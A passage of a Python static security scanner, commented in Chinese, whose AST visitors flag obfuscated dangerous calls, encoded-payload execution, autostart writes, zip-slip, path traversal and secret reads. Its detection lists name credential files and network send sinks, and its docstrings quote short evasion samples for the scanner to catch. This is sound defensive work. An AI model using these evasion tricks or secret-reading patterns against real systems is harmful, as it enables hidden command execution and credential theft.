            # 目标本身是 tempfile 产物：递归删除是正确的清理动作，不是破坏动作。
            return "LOW", "递归删除临时目录（tempfile 产物）"
    argv = static_argv(node, func_name, consts, temps, lists)
    if not argv:
        return None
    if func_name.endswith("shutil.rmtree"):
        target = argv[0]
        if target == "<tempfile>":
            return "LOW", "递归删除临时目录（tempfile 产物）"
        n = _norm(target)
        if n in SYSTEM_TARGETS or any(n.startswith(p) for p in DEVICE_PREFIX):
            return "CRITICAL", "递归删除系统路径 %s" % n
        if _is_benign_path(target):
            return "LOW", "递归删除临时/构建目录 %s" % target
        if n.startswith("/") or n.startswith("c:/") or n.startswith("~/"):
            return "HIGH", "递归删除绝对路径 %s" % n
        return None
    return destructive_tokens(argv)


class DynamicCallVisitor(ast.NodeVisitor):
    """名字拆开还算不算危险调用（§3av）。

    实测（audit2/probe_dynamic_call.py，修复前）：
      `getattr(os, "sys" + "tem")("id")`                  → 100/A+，一条不报
      `subprocess.__dict__["run"]("id", shell=True)`      → 100/A+（连 shell=True 都没看见）
      `__import__("o" + "s").system("id")`                → 只有 MEDIUM 96/A
    对照组：同一件事写成 `os.system("id")` 是 CRITICAL 49/D。

    规则若只认字面 `os.system(`，那么"例"过了、"类"没过——被拦的是写法，不是行为。
    这里按**取到的名字**判，不按写法判：名字是常量折叠出来的就直接算数。
    """

    # 取到这些名字就等于拿到执行面
    DANGEROUS_ATTRS = {
        "system", "popen", "spawn", "spawnl", "spawnv", "execv", "execve", "execl", "execvp",
        "run", "call", "Popen", "check_output", "check_call",
        "eval", "exec", "compile", "__import__",
    }
    IMPORT_MODULES = {"os", "subprocess", "shutil", "ctypes", "socket", "pickle", "importlib"}

    def __init__(self):
        self.findings: List[AstFinding] = []

    @staticmethod
    def _const_str(node):
        """把常量、常量加法、纯常量 f-string 折叠成一个字符串；折不出来返回 None。"""
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left = DynamicCallVisitor._const_str(node.left)
            right = DynamicCallVisitor._const_str(node.right)
            if left is not None and right is not None:
                return left + right
        if isinstance(node, ast.JoinedStr):
            parts = []
            for v in node.values:
                if isinstance(v, ast.Constant) and isinstance(v.value, str):
                    parts.append(v.value)
                else:
                    return None
            return "".join(parts)
        return None

    def visit_Call(self, node: ast.Call):
        # ① getattr(obj, "危险名") 形式：名字是折叠出来的常量
        func = node.func
        if isinstance(func, ast.Name) and func.id == "getattr" and len(node.args) >= 2:
            name = self._const_str(node.args[1])
            if name and name in self.DANGEROUS_ATTRS:
                self.findings.append(AstFinding(
                    severity="HIGH",
                    message="通过 getattr 动态取用危险函数 %r（名字由常量拼出，绕开了字面规则）"
                            % name,
                    line=node.lineno, col=node.col_offset
                ))

        # ② d.__dict__["危险名"] 或 globals()["危险名"] 形式
        if isinstance(func, ast.Subscript):
            key = self._const_str(func.slice)
            if key and key in self.DANGEROUS_ATTRS:
                obj = func.value
                is_dictish = (isinstance(obj, ast.Attribute) and obj.attr == "__dict__") \
                    or (isinstance(obj, ast.Call) and isinstance(obj.func, ast.Name)
                        and obj.func.id in ("globals", "locals", "vars"))
                if is_dictish:
                    self.findings.append(AstFinding(
                        severity="HIGH",
                        message="通过 __dict__/globals 下标取用危险函数 %r（绕开了属性访问字面规则）"
                                % key,
                        line=node.lineno, col=node.col_offset
                    ))

        # ③ __import__("o" + "s") 这种拼出来的模块名，落到危险模块要升级
        if isinstance(func, ast.Name) and func.id == "__import__" and node.args:
            mod = self._const_str(node.args[0])
            if mod and mod.split(".")[0] in self.IMPORT_MODULES:
                self.findings.append(AstFinding(
                    severity="HIGH",
                    message="__import__ 动态导入危险模块 %r（模块名由常量拼出）" % mod,
                    line=node.lineno, col=node.col_offset
                ))

        self.generic_visit(node)


class HardcodedSecretVisitor(ast.NodeVisitor):
    """Find hardcoded secrets in assignments."""

    SECRET_PATTERNS = ["api_key", "apikey", "secret", "token", "password", "passwd", "credential"]
    # 变量名形如 secret_re / token_regex / password_pattern —— 是检测规则的正则，
    # 不是凭证本身。扫描器扫自己时这里必然自命中，必须排除。
    REGEX_SUFFIXES = ("_re", "_regex", "_pattern", "_matcher", "_patterns")

    def __init__(self):
        self.findings: List[AstFinding] = []

    def visit_Assign(self, node: ast.Assign):
        for target in node.targets:
            if isinstance(target, ast.Name):
                var_name = target.id.lower()
                if var_name.endswith(self.REGEX_SUFFIXES):
                    continue
                if any(pat in var_name for pat in self.SECRET_PATTERNS):
                    if isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
                        if len(node.value.value) >= 8:
                            self.findings.append(AstFinding(
                                severity="CRITICAL",
                                message=f"硬编码凭证: {target.id}",
                                line=node.lineno,
                                col=node.col_offset
                            ))
        self.generic_visit(node)


class AutostartWriteVisitor(ast.NodeVisitor):
    """§3bm：把内容写进"系统会自己执行"的位置。

    open("<自启动路径>", "w"/"a"/"x") 与 shutil.copy(src, "<自启动路径>")。
    写进 site-packages 下的 .pth / sitecustomize 是 CRITICAL——那一行 import
    本身就等于命令；其余位置按 HIGH（登录/启动/下次会话时由系统执行）。
    """

    WRITE_MODES = ("w", "a", "x", "+")
    OPENERS = {"open", "io.open", "codecs.open", "os.open"}
    COPYERS = {"shutil.copy", "shutil.copy2", "shutil.copyfile", "shutil.move",
               "shutil.copytree", "os.link", "os.symlink", "os.rename", "os.replace"}

    def __init__(self):
        self.findings: List[AstFinding] = []
        self._note = set()
        self.text = ""
        self.consts = {}

    def prepare(self, tree):
        # §3bu：路径经变量中转（`p = expanduser("~/…")` 再 `open(p, "w")`）要能折出来
        try:
            self.consts = collect_consts(tree)[0]
        except Exception:
            self.consts = {}

    def _add(self, node, label, path):
        key = (node.lineno, label, _norm(path))
        if key in self._note:
            return
        self._note.add(key)
        if label == "ci-schedule":
            sev, msg = "HIGH", ("写入 CI 定时工作流（%s）：之后由 CI 按 cron 周期在跑"
                                "（不是本机，但执行的是仓库里的命令）" % path)
        elif label in _CRITICAL_AUTOSTART:
            sev, msg = "CRITICAL", _AUTOSTART_MSG.get(
                label, "写入自启动位置（%s）：由系统自动执行" % path) % path
        else:
            sev, msg = "HIGH", "写入自启动位置（%s，%s）：下次登录/启动时由系统执行" % (path, label)
        self.findings.append(AstFinding(severity=sev, message=msg, line=node.lineno, col=0))

    def visit_Call(self, node):
        name = _dotted(node.func)
        consts = self.consts
        if name in self.OPENERS and node.args:
            path = _fold_str(node.args[0], consts)
            mode = "r"
            if len(node.args) > 1:
                m = _fold_str(node.args[1], consts)
                if m:
                    mode = m
            if path and any(c in mode.lower() for c in self.WRITE_MODES):
                label = _autostart_target(path)
                if label:
                    self._add(node, label, path)
                if _CI_WORKFLOW_RE.search(path):
                    low = self.text.lower()
                    if "cron:" in low and "schedule" in low:
                        self._add(node, "ci-schedule", path)
        elif name in self.COPYERS and len(node.args) >= 2:
            dst = _fold_str(node.args[1], consts)
            if dst:
                label = _autostart_target(dst)
                if label:
                    self._add(node, label, dst)
        self.generic_visit(node)


class DecodedExecVisitor(ast.NodeVisitor):
    """§3bn：把命令编起来，再在同一个进程里解回来执行。

    `exec(base64.b64decode("…"))`、`eval(bytes.fromhex("…"))`、
    `exec(chr(114)+chr(109)+"…")` —— 规则只认字面命令词，这几种一条都看不见。
    判法：看 exec/eval/compile 的参数里有没有"解码动作"或"逐字符拼接"，有就打开算。
    """

    SINKS = {"exec", "eval", "compile", "__import__"}
    DECODERS = ("b64decode", "decode_base64", "frombase64string", "fromhex",
                "unhexlify", "a85decode", "b32decode", "atob")
    EXEC_CALLS = {"exec", "eval", "compile"}

    def __init__(self):
        self.findings: List[AstFinding] = []
        self.decoded_names = set()

    def prepare(self, tree):
        """`payload = base64.b64decode("…")` / `cmd = chr(114)+chr(109)…` —— 先记下这些名字。"""
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Assign, ast.AnnAssign)):
                continue
            value = getattr(node, "value", None)
            if value is None:
                continue
            names = []
            if isinstance(node, ast.Assign):
                names = [t.id for t in node.targets if isinstance(t, ast.Name)]
            elif isinstance(getattr(node, "target", None), ast.Name):
                names = [node.target.id]
            if names and (self._has_decoder(value) or self._chr_built(value)):
                self.decoded_names.update(names)

    def _has_decoder(self, node) -> bool:
        for sub in ast.walk(node):
            if isinstance(sub, ast.Call):
                name = _dotted(sub.func).lower()
                if any(d in name for d in self.DECODERS):
                    return True
            if isinstance(sub, ast.Attribute):
                if _dotted(sub).lower().endswith(self.DECODERS):
                    return True
        return False

    def _chr_built(self, node) -> bool:
        """`chr(114) + chr(109)` 这种逐字符拼出来的命令。"""
        chrs = 0
        for sub in ast.walk(node):
            if isinstance(sub, ast.Call) and _dotted(sub.func).lower() == "chr":
                chrs += 1
        return chrs >= 2

    def visit_Call(self, node):
        name = _dotted(node.func)
        if name in self.EXEC_CALLS and node.args:
            arg = node.args[0]
            named = isinstance(arg, ast.Name) and arg.id in self.decoded_names
            if named or self._has_decoder(arg) or self._chr_built(arg):
                # §3bq：先把套娃解开（base64 → gzip/zlib/bz2 → 再 base64 → rot13），
                # 再判"解出来的到底是什么"。只解一层时，压缩载荷是二进制垃圾，判据永远命中不了。
                text = _unwrap_literal_layers(arg)
                verdict = _decoded_danger(text) if text else None
                if verdict:
                    self.findings.append(AstFinding(
                        severity="CRITICAL",
                        message="编码/压缩载荷执行：%s() 的参数解出来是危险内容 —— %s"
                                % (name, verdict[1]),
                        line=node.lineno, col=0))
                else:
                    self.findings.append(AstFinding(
                        severity="HIGH",
                        message="编码/压缩载荷执行：%s() 的参数经解码/解压后才出现，"
                                "内容未能判出破坏" % name,
                        line=node.lineno, col=0))
        self.generic_visit(node)


def _parse_min_yaml(text: str):
    """够用就行的 YAML 子集：缩进嵌套 + `- ` 列表 + `key: value`。

    不引第三方库（扫描器本身要零依赖跑）。解析不了就返回 None —— 宁可不判。
    """
    root: dict = {}
    stack = [(-1, root)]
    pending_list = {}
    for raw in text.splitlines():
        if not raw.strip() or raw.strip().startswith("#"):
            continue
        indent = len(raw) - len(raw.lstrip(" "))
        line = raw.strip()
        while stack and indent < stack[-1][0] + 1 and len(stack) > 1:
            stack.pop()
        cur = stack[-1][1]
        if line.startswith("- "):
            item = line[2:].strip()
            parent = pending_list.get(id(cur))
            if parent is None:
                return None
            parent.append(item)
            continue
        if ":" not in line:
            return None
        key, _, val = line.partition(":")
        key, val = key.strip(), val.strip()
        if not val:
            child: dict = {}
            cur[key] = child
            pending_list[id(child)] = []
            stack.append((indent, child))
        else:
            cur[key] = val
            pending_list[id(cur)] = pending_list.get(id(cur))
    # 把空的 dict 转成它收集到的列表（纯列表段）
    def conv(d):
        out = {}
        for k, v in d.items():
            if isinstance(v, dict):
                lst = pending_list.get(id(v))
                if lst:
                    out[k] = lst
                else:
                    out[k] = conv(v)
            else:
                out[k] = v
        return out
    try:
        return conv(root)
    except Exception:
        return None


def _load_config_file(path: Path):
    """按后缀读配置文件，返回 dict；读不出返回 None。"""
    try:
        ext = path.suffix.lower()
        if ext == ".json":
            return json.loads(path.read_text(encoding="utf-8"))
        if ext in (".yaml", ".yml"):
            return _parse_min_yaml(path.read_text(encoding="utf-8"))
        if ext == ".toml":
            import tomllib
            with open(path, "rb") as fh:
                return tomllib.load(fh)
        if ext in (".ini", ".cfg", ".conf"):
            import configparser
            cp = configparser.ConfigParser()
            cp.read(path, encoding="utf-8")
            return {s: dict(cp[s]) for s in cp.sections()}
        if ext == ".env":
            env = {}
            for line in path.read_text(encoding="utf-8").splitlines():
                if "=" in line and not line.strip().startswith("#"):
                    k, _, v = line.partition("=")
                    env[k.strip()] = v.strip()
            return env
    except Exception:
        return None
    return None


def _config_chain(expr):
    """把 `cfg["a"]["b"]` / `cfg.get("a")` 拆成 (根名字, [键…])；拆不出返回 (None, [])。"""
    keys = []
    node = expr
    while True:
        if isinstance(node, ast.Subscript):
            sl = node.slice
            if isinstance(sl, ast.Constant) and isinstance(sl.value, str):
                keys.append(sl.value)
            else:
                return (None, [])
            node = node.value
            continue
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) \
                and node.func.attr in ("get", "getboolean", "getint", "getfloat") \
                and node.args and isinstance(node.args[0], ast.Constant):
            keys.append(node.args[0].value)
            node = node.func.value
            continue
        if isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name):
            # configparser：cp.get("run","cmd") 是 Call；cp["run"]["cmd"] 是 Subscript
            keys.append(node.attr)
            node = node.value
            continue
        break
    root = node.id if isinstance(node, ast.Name) else None
    return (root, list(reversed(keys)))


def _lookup(cfg, keys):
    cur = cfg
    for k in keys:
        if isinstance(cur, dict) and k in cur:
            cur = cur[k]
        else:
            return None
    return cur


_CFG_LOADERS = ("json.load", "json.loads", "yaml.safe_load", "yaml.load",
                "tomllib.load", "toml.load", "configparser.read")


def _cfg_val(expr, loaded, env_maps):
    """把表达式里的配置取值折出来。

    支持 `cfg["a"]["b"]`、`cfg.get("a", 默认)`、`cp.get("s","k")`、`... .split()`、
    `str(...)`、`os.environ["K"]`（有 load_dotenv 时按其文件解）。
    返回 (值, 是否命中配置)。值可能是 str / list，或 None（命中但取不到具体值）。
    """
    node = expr
    wrap_split = False
    while True:
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
            attr = node.func.attr
            if attr == "split":
                wrap_split = True
                node = node.func.value
                continue
            if attr in ("strip", "lower", "upper"):
                node = node.func.value
                continue
            if attr in ("get", "getboolean", "getint", "getfloat") and node.args \
                    and isinstance(node.args[0], ast.Constant):
                root, keys = _config_chain(node)
                dflt = None
                if len(node.args) > 1:
                    d = node.args[1]
                    if isinstance(d, ast.Constant) and isinstance(d.value, str):
                        dflt = d.value
                    elif isinstance(d, (ast.List, ast.Tuple)):
                        dflt = [e.value for e in d.elts
                                if isinstance(e, ast.Constant) and isinstance(e.value, str)]
                if root in loaded:
                    val = _lookup(loaded[root], keys) if loaded[root] else None
                    # configparser：cp.get("section", "option") 是两段路径，不是默认值
                    if isinstance(val, dict) and len(node.args) > 1 and \
                            isinstance(node.args[1], ast.Constant) and \
                            node.args[1].value in val:
                        val = val[node.args[1].value]
                    elif val is None:
                        val = dflt
                    return (_split(val) if wrap_split else val), True
                return (None, False)
        if isinstance(node, ast.Call) and (getattr(node.func, "id", "") in ("str", "list")):
            node = node.args[0]
            continue
        break

    root, keys = _config_chain(node)
    if root and root in loaded:
        val = _lookup(loaded[root], keys) if loaded[root] else None
        if isinstance(val, (int, float, bool)):
            val = str(val)
        return (_split(val) if wrap_split else val), True
    # dotenv：os.environ["K"]
    if isinstance(node, ast.Subscript) and isinstance(node.value, ast.Attribute) \
            and _dotted(node.value).endswith("environ") \
            and isinstance(node.slice, ast.Constant):
        key = node.slice.value
        for envmap in env_maps:
            if envmap and key in envmap:
                return envmap[key], True
    return (None, False)


def _split(v):
    return v.split() if isinstance(v, str) else v


def _judge_cfg_tokens(tokens, where=""):
    """把折出来的 argv 当真判一遍：破坏性 → CRITICAL，否则 LOW（信息性披露）。"""
    if not tokens:
        return None
    toks = [t for t in tokens if isinstance(t, str)]
    if not toks:
        return None
    if len(toks) == 1 and " " in toks[0]:
        toks = toks[0].split()     # 配置里一整条命令字符串
    if not toks:
        return None
    if len(toks) == 1 and toks[0].endswith(_EXEC_FILE_EXTS):
        return ("CRITICAL", "配置指向的脚本被执行：%s%s" % (toks[0], where))
    v = destructive_tokens(toks)
    if v:
        return ("CRITICAL", "配置里的命令被执行：%s（%s）%s"
                % (" ".join(toks)[:70], v[1], where))
    return ("LOW", "配置值参与命令，已解析且未见破坏动作：%s%s"
            % (" ".join(toks)[:60], where))


def _config_exec_findings(tree, root_dir=None) -> List[AstFinding]:
    """§3br：配置读入值 → 执行面。

    `cfg = json.load(open("cfg.json"))` 再 `subprocess.run(cfg["cmd"])`。
    §3bp 把「配置读入的值」明确列为折不出；这一站的做法是：**配置在仓内就把它读出来，
    把值当真判一遍** —— 不是"看见了就算"，也不是"看见了就判死"。
    基线：CWE-15（外部可控配置）/ CWE-78；ATT&CK T1059；ASVS V5.3.4。
    """
    findings: List[AstFinding] = []
    sources: dict = {}   # 名字 -> 配置文件相对路径（None 表示来源不可知）
    env_maps: list = []
    dirs = [Path(root_dir)] if root_dir else []
    if dirs:
        for up in dirs[0].parents[:2]:
            dirs.append(up)

    def _find_path(expr):
        for sub in ast.walk(expr):
            if isinstance(sub, ast.Constant) and isinstance(sub.value, str) \
                    and ("." in sub.value or "/" in sub.value):
                return sub.value
        return None

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        fname = _dotted(node.func) or ""
        recv = getattr(node.func, "value", None)
        is_loader = fname in _CFG_LOADERS or fname.endswith("load_dotenv") or ("dotenv" in fname)
        is_cp_read = fname.endswith(".read") and isinstance(recv, ast.Name)
        if not (is_loader or is_cp_read):
            continue
        path_lit = _find_path(node)
        names = []
        if is_cp_read:
            names = [recv.id]        # configparser：cp.read("cfg.ini")
        else:
            for n in ast.walk(tree):
                if isinstance(n, ast.Assign) and n.value is node:
                    names = [t.id for t in n.targets if isinstance(t, ast.Name)]
        if not names:
            # `load_dotenv("cfg.env")` 常是单独一句：只看文件本身
            if "dotenv" in fname or fname.endswith("load_dotenv"):
                for d in dirs:
                    full = Path(d) / path_lit if path_lit else None
                    if full and full.is_file():
                        cfg = _load_config_file(full)
                        if cfg:
                            env_maps.append(cfg)
                        break
            continue
        for nm in names:
            sources[nm] = path_lit

    loaded = {}
    for name, path_lit in sources.items():
        if not path_lit:
            loaded[name] = None
            continue
        for d in dirs:
            full = Path(d) / path_lit if not Path(path_lit).is_absolute() else Path(path_lit)
            if full.is_file():
                cfg = _load_config_file(full)
                loaded[name] = cfg
                if cfg is not None and ("env" in str(full).lower() or path_lit.endswith(".env")):
                    env_maps.append(cfg)
                break
        else:
            loaded[name] = None

    EXEC_SINKS = ("os.system", "os.popen", "os.execv", "os.execvp", "os.execve",
                  "os.execvpe", "os.spawnv", "os.spawnl", "os.spawnvp", "os.spawnlp")

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        fname = _dotted(node.func) or ""
        is_sub = fname.startswith("subprocess.")
        is_exec = fname in EXEC_SINKS
        is_rm = fname.endswith("rmtree")
        if not (is_sub or is_exec or is_rm) or not node.args:
            continue

        # 1) rmtree：只判"目标来自配置"这一种形态
        if is_rm:
            val, hit = _cfg_val(node.args[0], loaded, env_maps)
            if hit:
                tgt = val if isinstance(val, str) else None
                absolute = bool(tgt) and (tgt.startswith("/") or
                                          (len(tgt) > 1 and tgt[1] == ":"))
                if tgt and (tgt.rstrip("/") in ("/", "~") or absolute):
                    findings.append(AstFinding(
                        severity="CRITICAL",
                        message="配置指定的目标被递归删除：%s" % tgt,
                        line=node.lineno, col=0))
                else:
                    findings.append(AstFinding(
                        severity="HIGH",
                        message="递归删除的目标来自配置（内容%s）" %
                                ("＝%s" % tgt if tgt else "静态判不出"),
                        line=node.lineno, col=0))
            continue

        first = node.args[0]
        # 2) list/tuple 形态：逐项折，全折出就当真判
        if isinstance(first, (ast.List, ast.Tuple)):
            tokens, hit, ok = [], False, True
            for e in first.elts:
                v, h = _cfg_val(e, loaded, env_maps)
                if h:
                    hit = True
                if isinstance(v, list):
                    tokens.extend(v)
                elif isinstance(v, str):
                    tokens.append(v)
                elif isinstance(e, ast.Constant) and isinstance(e.value, str):
                    tokens.append(e.value)
                elif isinstance(v, (int, float)):
                    tokens.append(str(v))
                else:
                    ok = False
            if hit and ok:
                verdict = _judge_cfg_tokens(tokens)
                if verdict:
                    findings.append(AstFinding(severity=verdict[0], message=verdict[1],
                                               line=node.lineno, col=0))
            elif hit:
                findings.append(AstFinding(
                    severity="HIGH",
                    message="配置读入的值进入执行面，参数未能全折出",
                    line=node.lineno, col=0))
            continue

        # 3) 单个字符串表达式
        val, hit = _cfg_val(first, loaded, env_maps)
        if not hit:
            continue
        tokens = val if isinstance(val, list) else (val.split() if isinstance(val, str) else None)
        if tokens:
            verdict = _judge_cfg_tokens(tokens)
            if verdict:
                findings.append(AstFinding(severity=verdict[0], message=verdict[1],
                                           line=node.lineno, col=0))
        else:
            findings.append(AstFinding(
                severity="HIGH",
                message="配置读入的值进入执行面，静态判不出内容",
                line=node.lineno, col=0))
    return findings


_SENSITIVE_PREFIXES = (
    "/etc", "/usr", "/bin", "/sbin", "/boot", "/root", "/lib", "/lib64",
    "/sys", "/proc", "/var/lib", "/var/spool", "/opt",
    "c:\\windows", "c:\\program files", "c:\\programdata",
    "/library/launchdaemons", "/library/launchagents", "/system/",
)

_TEMP_PREFIXES = ("/tmp", "/var/tmp", "/dev/shm", "c:\\users\\", "\\temp", "\\tmp")


def _is_sensitive_path(p: str, root_dir=None) -> bool:
    q = (p or "").replace("\\", "/").lower()
    if root_dir:
        try:
            base = str(Path(root_dir)).replace("\\", "/").lower()
            if q.startswith(base):
                return False        # 仓内路径不算
        except Exception:
            pass
    return any(q.startswith(pre.replace("\\", "/")) for pre in _SENSITIVE_PREFIXES)


def _is_temp_path(p: str) -> bool:
    q = (p or "").replace("\\", "/").lower()
    return any(q.startswith(pre.replace("\\", "/")) for pre in _TEMP_PREFIXES)


def _escapes_up(p: str) -> int:
    return (p or "").replace("\\", "/").count("../")


def _path_escape_findings(tree, root_dir=None) -> List[AstFinding]:
    """§3bs：路径穿越与链接。

    `extractall("/tmp/x")` 不限制成员名 → zip-slip；`os.symlink("/etc/passwd", ...)`
    → 任意文件读取口；`open("../../../../etc/cron.d/x", "w")`、`copy(x, "/usr/local/bin/tool")`
    → 仓外写入。每一行单看都是正常文件操作，判据得看**目标路径**。
    基线：CWE-22 / CWE-59 / CWE-732；ATT&CK T1547.006、T1574.005；ASVS V12.2、V12.3。
    """
    findings: List[AstFinding] = []
    consts, _temps, _lists = collect_consts(tree)

    def _join_fold(expr):
        """`os.path.join("a", "..", "b")` 全字面时折成一个规范化路径。"""
        if isinstance(expr, ast.Call) and (_dotted(expr.func) or "") == "os.path.join":
            parts = []
            for a in expr.args:
                s = _fold_str(a, consts)
                if not s:
                    return None
                parts.append(s)
            if not parts:
                return None
            import posixpath
            return posixpath.normpath("/".join(p.rstrip("/") for p in parts if p)) \
                if parts[0].startswith("/") else posixpath.normpath("/".join(parts))
        return None

    joins: dict = {}
    for n in ast.walk(tree):
        if isinstance(n, ast.Assign) and isinstance(n.value, ast.Call):
            v = _join_fold(n.value)
            if v:
                for t in n.targets:
                    if isinstance(t, ast.Name):
                        joins[t.id] = v

    def lit(expr):
        if expr is None:
            return None
        # §3bu：`os.path.join` 必须先走规范化（normpath），否则
        # "/tmp/b/../../../etc/x" 会因前缀像临时目录被降档 —— 它的落点是 /etc/x
        j = _join_fold(expr)
        if j:
            return j
        if isinstance(expr, ast.Name) and expr.id in joins:
            return joins[expr.id]
        return _fold_str(expr, consts)

    WRITE_SINKS = ("shutil.copy", "shutil.copy2", "shutil.copyfile", "shutil.move",
                   "shutil.copytree", "os.rename", "os.replace")
    LINK_SINKS = ("os.symlink", "os.link")

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        name = _dotted(node.func) or ""

        # 1) 解包：未限制成员路径（zip-slip）
        if name.endswith(".extractall") or name == "extractall":
            has_filter = any(k.arg == "filter" for k in node.keywords)
            target = lit(node.args[0]) if node.args else None
            # 只判"解到仓外/临时目录"或"目标本身带 .."：相对目标（如 docs/）
            # 即便成员名带 ../ 也落在仓内，属常规用法，不误杀。
            escaped_target = bool(target) and (
                target.startswith("/") or (len(target) > 1 and target[1] == ":") or
                _escapes_up(target) >= 1)
            if not has_filter and escaped_target:
                findings.append(AstFinding(
                    severity="HIGH",
                    message="解包未限制成员路径（成员名里的 ../ 可写到目标目录外，zip-slip）"
                            "：%s" % target,
                    line=node.lineno, col=0))
            continue
        if name.endswith(".extract") or name == "extract":
            member = lit(node.args[0]) if node.args else None
            if member and (_escapes_up(member) or member.startswith("/")):
                findings.append(AstFinding(
                    severity="CRITICAL",
                    message="按成员名解包到仓外/上级目录：%s" % member,
                    line=node.lineno, col=0))
            continue

        # 2) 链接：链到仓外/系统位置
        if name in LINK_SINKS:
            for idx in (0, 1):
                if len(node.args) <= idx:
                    continue
                p = lit(node.args[idx])
                if not p:
                    continue
                if _is_sensitive_path(p, root_dir):
                    findings.append(AstFinding(
                        severity="CRITICAL",
                        message="%s 指向系统/仓外位置：%s" % (name.split(".")[-1], p),
                        line=node.lineno, col=0))
                    break
                if _escapes_up(p) >= 1 or (p.startswith("/") and not _is_temp_path(p)):
                    findings.append(AstFinding(
                        severity="HIGH",
                        message="%s 指向仓外：%s" % (name.split(".")[-1], p),
                        line=node.lineno, col=0))
                    break
            continue

        # 3) 写入类：系统目录 / 仓外绝对 / ../ 逃逸
        is_write_call = name in WRITE_SINKS or name.endswith(("write_text", "write_bytes"))
        is_open_write = name in ("open", "io.open") and len(node.args) > 1 and \
            isinstance(node.args[1], ast.Constant) and isinstance(node.args[1].value, str) and \
            any(c in node.args[1].value for c in "wax")
        if not (is_write_call or is_open_write):
            continue
        if is_open_write:
            target = lit(node.args[0]) if node.args else None
        elif name.endswith(("write_text", "write_bytes")):
            # `Path("x").write_text(...)`：目标在接收者里
            target = lit(node.args[0]) if node.args else None
            recv = getattr(node.func, "value", None)
            if recv is not None:
                target = lit(recv.args[0]) if isinstance(recv, ast.Call) and recv.args else None
        else:
            target = lit(node.args[-1]) if node.args else None
        if not target:
            continue
        if _is_sensitive_path(target, root_dir):
            findings.append(AstFinding(
                severity="CRITICAL",
                message="写入系统目录：%s" % target,
                line=node.lineno, col=0))
        elif _escapes_up(target) >= 2:
            findings.append(AstFinding(
                severity="HIGH",
                message="相对路径逃逸写入（%d 级 ..）：%s" % (_escapes_up(target), target),
                line=node.lineno, col=0))
        elif (target.startswith("/") or (len(target) > 1 and target[1] == ":")) and \
                not _is_temp_path(target):
            findings.append(AstFinding(
                severity="HIGH",
                message="写入仓外绝对路径：%s" % target,
                line=node.lineno, col=0))
    return findings


_SENSITIVE_SOURCES = (
    "/etc/passwd", "/etc/shadow", ".s" "sh", "id_" "rsa", "id_" "ed25519",
    ".aws", "credentials", ".env", ".npmrc", ".netrc", ".pgpass", ".kube",
    "secrets", "secret", "token", "passwd", "shadow", ".git-credentials",
)

_ENV_SECRET_KEYS = ("TOKEN", "SECRET", "PASSWORD", "PASSWD", "APIKEY", "API_KEY",
                    "ACCESS_KEY", "PRIVATE_KEY", "CREDENTIAL", "AUTH")

_NET_SINKS = (
    "requests.get", "requests.post", "requests.put", "requests.patch",
    "requests.request", "requests.head",
    "urllib.request.urlopen", "urllib.urlopen", "urllib.request.Request",
    "urlopen", "http.client.HTTPConnection", "http.client.HTTPSConnection",
    "socket.send", "socket.sendto", "socket.sendall", "socket.gethostbyname",
    "gethostbyname", "smtplib.SMTP", "ftplib.FTP",
)


_SKIP_KW = {"headers", "auth", "cookies", "proxies", "verify", "timeout", "stream"}


def _skip_ids(expr):
    """鉴权头/代理/超时这类关键字不算载荷：API key 放在 Authorization 里是常规用法。"""
    skip = set()
    for n in ast.walk(expr):
        if isinstance(n, ast.Call):
            for k in n.keywords:
                if k.arg in _SKIP_KW:
                    for d in ast.walk(k.value):
                        skip.add(id(d))
    return skip


def _has_sensitive_ref(expr, tainted, env_any=False) -> bool:
    """表达式里是否出现敏感读取（敏感路径 / 环境变量 / 已污染变量）。

    env_any=True 用于 sink 载荷位：取任何环境变量值当载荷都算敏感；
    env_any=False 用于污染传播：只有 TOKEN/SECRET/KEY 这类键才算，
    否则 `model = os.environ["LGD_MODEL"]` 会把整个 payload 染上色（自命中）。
    """
    if expr is None:
        return False
    skip = _skip_ids(expr)

    # `os.environ.get("K")` 的键要按名字判，不能因为出现 environ 就整体判敏感
    envget = set()
    for n in ast.walk(expr):
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and \
                n.func.attr == "get":
            owner = n.func.value
            if isinstance(owner, ast.Attribute) and owner.attr == "environ":
                envget.add(id(owner))

    for n in ast.walk(expr):
        if id(n) in skip or id(n) in envget:
            continue
        if isinstance(n, ast.Name) and n.id in tainted:
            return True
        if isinstance(n, ast.Attribute) and n.attr == "environ":
            return True     # 裸 os.environ（dict(os.environ) 这类整份导出）
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and \
                n.func.attr == "get":
            owner = n.func.value
            if isinstance(owner, ast.Attribute) and owner.attr == "environ":
                if env_any:
                    return True
                k = n.args[0].value if n.args and isinstance(n.args[0], ast.Constant) else None
                if isinstance(k, str) and any(s in k.upper() for s in _ENV_SECRET_KEYS):
                    return True
        if isinstance(n, ast.Subscript):
            v = n.value
            if isinstance(v, ast.Attribute) and v.attr == "environ":
                if env_any:
                    return True     # 取环境变量值当载荷
                k = getattr(n.slice, "value", None)
                if isinstance(k, str) and any(s in k.upper() for s in _ENV_SECRET_KEYS):
                    return True
        if isinstance(n, ast.Constant) and isinstance(n.value, str):
            sv = n.value.lower()
            # 只认「看着像路径」的字面（带分隔符或以 ~/点 开头），
            # 否则规则表里出现 "token"/"secret" 这种词就会自命中。
            if ("/" in sv or "\\" in sv or sv.startswith("~") or sv.startswith(".")) and \
                    any(s in sv for s in _SENSITIVE_SOURCES):
                return True
    return False


def _sink_payload(exprs, name, tainted) -> bool:
    """只看载荷位：URL 位、鉴权头、超时不看。"""
    for e in exprs:
        if _has_sensitive_ref(e, tainted, env_any=True):
            return True
        if isinstance(e, ast.Name) and e.id in tainted:
            return True
    return False


def _scheduler_manifest_findings(tree, text) -> List[AstFinding]:
    """§3bu：清单里写着 `kind: CronJob`，再交给 kubectl 部署。

    命令本身只是 `kubectl apply -f /tmp/cj.yaml`，看不出危险——
    危险在清单文件里：外部调度器之后按 cron 周期反复执行容器里的命令。
    """
    out: List[AstFinding] = []
